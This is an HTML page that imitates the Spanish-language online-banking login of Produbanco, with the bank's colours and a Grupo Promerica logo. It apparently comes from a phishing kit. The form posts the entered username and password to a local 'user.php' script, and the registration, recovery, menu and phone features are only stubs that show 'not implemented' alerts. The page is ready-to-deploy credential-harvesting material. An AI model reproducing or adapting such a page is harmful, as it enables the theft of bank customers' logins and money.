<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Produbanco - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #003F20;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            margin: 0;
        }

        .container {
            width: 100%;
            max-width: 100vw;
            min-height: 100vh;
            background: #003F20;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 25px;
            margin-top: 10px;
        }

        .menu-icon {
            display: flex;
            flex-direction: column;
            cursor: pointer;
        }

        .menu-icon span {
            width: 25px;
            height: 2px;
            background: white;
            margin: 3px 0;
            border-radius: 1px;
        }

        .phone-icon {
            cursor: pointer;
        }

        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 30px;
            margin-bottom: 30px;
        }

        .logo-img {
            width: auto;
            max-width: 380px;
            height: 140px;
            object-fit: contain;
            margin-bottom: 15px;
            filter: brightness(1.1);
        }

        .logo-subtitle {
            color: white;
            font-size: 16px;
            font-weight: 300;
            opacity: 0.9;
        }

        .login-container {
            background: white;
            border-radius: 25px 25px 0 0;
            flex: 1;
            padding: 30px 25px;
            min-height: 500px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
        }

        .login-container h2 {
            color: #333;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 30px;
        }

        .login-form {
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 15px 45px 15px 15px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            background: #f8f8f8;
            color: #333;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: #003F20;
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 63, 32, 0.1);
        }

        .input-group input::placeholder {
            color: #888;
        }

        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            background: #e0e0e0;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            color: #999;
            cursor: not-allowed;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }

        .login-btn.active {
            background: #003F20;
            color: white;
            cursor: pointer;
        }

        .login-btn.active:hover {
            background: #002a16;
        }

        .register-section {
            display: flex;
            align-items: center;
            padding: 20px;
            border: 1px solid #e0e0e0;
            border-radius: 15px;
            margin-bottom: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .register-section:hover {
            background: #f8f8f8;
            border-color: #003F20;
        }

        .register-icon {
            margin-right: 15px;
        }

        .register-content {
            flex: 1;
        }

        .register-content h3 {
            color: #333;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 2px;
        }

        .register-content p {
            color: #666;
            font-size: 14px;
        }

        .register-arrow {
            margin-left: 10px;
        }

        .recovery-link {
            text-align: center;
        }

        .recovery-link a {
            color: #003F20;
            font-size: 16px;
            font-weight: 600;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .recovery-link a:hover {
            color: #002a16;
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 450px) {
            .container {
                max-width: 100%;
            }

            .login-container {
                padding: 25px 20px;
            }

            .logo-img {
                max-width: 320px;
                height: 120px;
            }

            .logo-subtitle {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="menu-icon">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="phone-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                </svg>
            </div>
        </div>

        <!-- Logo -->
        <div class="logo-container">
            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
            <p class="logo-subtitle"></p>
        </div>

        <!-- Login Form -->
        <div class="login-container">
            <h2>Ingresa a tu Produbanco enlínea</h2>

            <form class="login-form" id="loginForm" method="POST" action="user.php">
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder="Usuario" required>
                    <div class="input-icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                    </div>
                </div>

                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                    <div class="input-icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </div>
                </div>

                <button type="submit" class="login-btn">Ingresar</button>
            </form>

            <!-- Register Section -->
            <div class="register-section">
                <div class="register-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
                        <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                        <line x1="16" y1="2" x2="16" y2="6"></line>
                        <line x1="8" y1="2" x2="8" y2="6"></line>
                        <line x1="3" y1="10" x2="21" y2="10"></line>
                    </svg>
                </div>
                <div class="register-content">
                    <h3>Crea tu usuario y contraseña</h3>
                    <p>Regístrate para iniciar sesión</p>
                </div>
                <div class="register-arrow">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003F20" stroke-width="2">
                        <polyline points="9,18 15,12 9,6"></polyline>
                    </svg>
                </div>
            </div>

            <!-- Recovery Link -->
            <div class="recovery-link">
                <a href="#" id="recoveryLink">Recuperar usuario y contraseña</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.querySelector('.login-btn');
            const loginForm = document.getElementById('loginForm');
            const recoveryLink = document.getElementById('recoveryLink');

            // Función para validar si los campos están llenos
            function validateForm() {
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (username && password) {
                    loginBtn.classList.add('active');
                    loginBtn.style.cursor = 'pointer';
                    loginBtn.textContent = 'Ingresar';
                } else {
                    loginBtn.classList.remove('active');
                    loginBtn.style.cursor = 'not-allowed';
                    loginBtn.textContent = 'Ingresar';
                }
            }

            // Event listeners para validar en tiempo real
            usernameInput.addEventListener('input', validateForm);
            passwordInput.addEventListener('input', validateForm);

            // Manejar envío del formulario
            loginForm.addEventListener('submit', function(e) {
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    e.preventDefault();
                    alert('Por favor completa todos los campos');
                    return;
                }

                // Mostrar estado de carga
                loginBtn.textContent = 'Ingresando...';
                loginBtn.style.background = '#002a16';
                loginBtn.disabled = true;

                // El formulario se enviará automáticamente a user.php por el método POST
            });

            // Manejar clic en "Crear usuario y contraseña"
            document.querySelector('.register-section').addEventListener('click', function() {
                alert('Redirección a registro no implementada');
            });

            // Manejar clic en "Recuperar usuario y contraseña"
            recoveryLink.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Funcionalidad de recuperación no implementada');
            });

            // Efecto de focus en inputs
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.classList.add('focused');
                });

                input.addEventListener('blur', function() {
                    this.parentElement.classList.remove('focused');
                });
            });

            // Animación del menú hamburguesa
            document.querySelector('.menu-icon').addEventListener('click', function() {
                alert('Menú no implementado');
            });

            // Funcionalidad del icono de teléfono
            document.querySelector('.phone-icon').addEventListener('click', function() {
                alert('Funcionalidad de llamada no implementada');
            });
        });
    </script>
</body>
</html>
